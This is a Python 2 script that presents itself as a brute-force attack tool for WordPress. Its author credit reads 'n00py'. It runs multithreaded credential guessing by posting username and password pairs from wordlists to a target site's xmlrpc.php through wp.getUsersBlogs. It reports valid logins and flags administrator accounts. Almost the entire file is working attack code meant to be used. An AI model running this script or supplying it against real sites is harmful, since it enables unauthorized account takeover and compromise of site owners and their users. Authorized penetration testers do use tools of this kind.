#########
#Import Libraries
import urllib2
import threading
import argparse
import sys
import time
#All this code has to do with adding colors to the terminal output
BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = range(8)
def has_colours(stream):
    if not hasattr(stream, "isatty"):
        return False
    if not stream.isatty():
        return False # auto color only on TTYs
    try:
        import curses
        curses.setupterm()
        return curses.tigetnum("colors") > 2
    except:
        # guess false in case of error
        return False
has_colours = has_colours(sys.stdout)
def printout(text, colour=WHITE):
        if has_colours:
                seq = "\x1b[1;%dm" % (30+colour) + text + "\x1b[0m"
                sys.stdout.write(seq)
        else:
                sys.stdout.write(text)
__author__ = 'Esteban Rodriguez (n00py)'
#Defines command line arguments
parser = argparse.ArgumentParser(description='This is a tool to brute force Worpress using the Wordpress API')
parser.add_argument('-i','--input', help='Input file name',required=True)
parser.add_argument('-w','--wordlist',help='Wordlist file name', required=True)
parser.add_argument('-u','--url',help='URL of target', required=True)
parser.add_argument('-v','--verbose',help=' Must type \'-vv\' for verbosity', required=False)
parser.add_argument('-t','--threads',help=' Determines the number of threads to be used, default is 10', type=int, default=10, required=False)
parser.add_argument('-a','--agent',help=' Determines the user-agent', type=str, default="WPForce Wordpress Attack Tool 1.0", required=False)
parser.add_argument('-d','--debug',help=' This option is used for determining issues with the script. Must type \'-dd\'', type=str, required=False)

args = parser.parse_args()
## show values ##
banner = """\


   ,-~~-.___.       __        __ ____   _____                      
  / |  x     \      \ \      / /|  _ \ |  ___|___   _ __  ___  ___       
 (  )        0       \ \ /\ / / | |_) || |_  / _ \ | '__|/ __|/ _ \.
  \_/-, ,----'  ____  \ V  V /  |  __/ |  _|| (_) || |  | (__|  __/                  
     ====      ||   \_ \_/\_/   |_|    |_|   \___/ |_|   \___|\___|                         
    /  \-'~;   ||     |
   /  __/~| ...||__/|-"   Brute Force Attack Tool for Wordpress     
 =(  _____||________|                 ~n00py~
                                                         
"""

#This is where the website is determined
website = args.url #"http://www.snarlsburg.com"
#This reads in a username file
u = open(args.input, 'r')
userlist = u.read().split('\n')
totalusers = len(userlist)
#this will be a global to count the total attempts
total = 0
#This defines the number of threads
threads = args.threads
#This reads in a password file
f = open(args.wordlist, 'r')
passlist = f.read().split('\n')
#This breaks the worlist up into pieces
print banner
print ("Username List: %s" % args.input )  + " (" + str(len(userlist)) + ")"
print ("Password List: %s" % args.wordlist )  + " (" + str(len(passlist)) + ")"
print ("URL: %s" % args.url )
def slice_list(input, size):
    input_size = len(input)
    slice_size = input_size / size
    remain = input_size % size
    result = []
    iterator = iter(input)
    for i in range(size):
        result.append([])
        for j in range(slice_size):
            result[i].append(iterator.next())
        if remain:
            result[i].append(iterator.next())
            remain -= 1
    return result
#the result is stored in list_array
list_array = slice_list(passlist, threads)
if(args.debug=="d"):
	print "Here is the content of the wordlists for each thread"
	for i in range(len(list_array)):
		print "Thread " + str(i)
		printout(str(list_array[i]), YELLOW)
		print "\n-----------------------------------------------------"
#This dictionary will hold the correct username/password combos
correct_pairs ={}
#makes the 'url' variable the domain plus xmlrpc.php
url = website +'/xmlrpc.php'
#This portion tests if the XMLRPC exists
print "Trying: " + url
try:
    urllib2.urlopen(url)
except urllib2.HTTPError, e:
    print url +" found!"
    print "Now the brute force will begin!  >:)"
except urllib2.URLError, g:
    printout("Could not identify XMLRPC.  Please verify it's existance.\n", YELLOW)
    sys.exit()
#If it gets a 405 error code (because we are GETing when we should POST) It begins, otherwise quits
if ((e.code) == 405):
	#This defines what happens in each thread
	def worker(wordlist,thread_no):
		tries =0
		#this count for ittertating through the user array
		# this count for ittertating through the password array
		count = 0
		global total
		for n in wordlist:
			#Goes through Userlist
			for x in userlist:
				user = userlist[tries]
				#sets 'password' to the current item in the wordlist
				password = wordlist[count]
				# Define what goes in HTTP request
				headers = { 'User-Agent' : args.agent, 
				'Connection' : 'keep-alive', 
				'Accept' : 'text/html'
				}
				#Running status information
				#percent =  "%.0f%%" % (100 * (count+1)/len(wordlist))
				if (args.verbose == "v" or args.debug =="d"):
					try_log = ""
					if ( args.debug =="d"):
						thready = "[Thread " + str(thread_no) + "]" 
						printout(thready, YELLOW)
					print "Trying " + user + " : " + password #+ "    " + str(percent) + " percent complete"
				# This is the RPC call
				post = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>" + user + "</string></value></param><param><value><string>" + password + "</string></value></param></params></methodCall>"
				req = urllib2.Request(url,post,headers)
				response = urllib2.urlopen(req)
				the_page = response.read()
				tries+=1
				# This looks for the 'isAdmin' string, which means the password worked
				look_for = "isAdmin"
				try:
						splitter = the_page.split(look_for,1)[1]
						# when it finds it, adds the pair to the correct_pairs dictionary
						correct_pairs[user] = password
						print "--------------------------"
						success = "[" + user + " : " + password + "] are valid credentials!  "
						adminAlert = ""
						if (splitter[23]=="1"):
							adminAlert = "- THIS ACCOUNT IS ADMIN"
						printout(success, GREEN) 
						printout(adminAlert, RED)
						print "\n--------------------------"
						adminAlert = ""
						#Since it was found, remove it from the list
						userlist.remove(user)

				except:
						pass
			#After going through the user list, set 'tries' back to 0 zero
			tries = 0
			#Count goes through to the next password
			count+=1
			#adds to the total
			total += 1
	threads = []
	#This builds each thread
	for i in range(len(list_array)):
		#A thread contains each item in the list_array
	    t = threading.Thread(target=worker, args=(list_array[i],i))
	    t.daemon = True
	    threads.append(t)
	    #Creates daemons, so the main thread can kill them
	    t.start()
	#this should keep the main thread open until all passwords have been tried
	while ((len(correct_pairs) <= totalusers) and  (len(passlist) > total)):
    		time.sleep(0.1)
    		sys.stdout.flush()
    		percent =  "%.0f%%" % (100 * (total)/len(passlist))
    		print " " + percent + " Percent Complete\r" ,
	print "\nAll correct pairs:"
	printout(str(correct_pairs), GREEN)
	print ""
else:
 	fail = url + " was not found.  Please verify."
 	printout(fail, RED)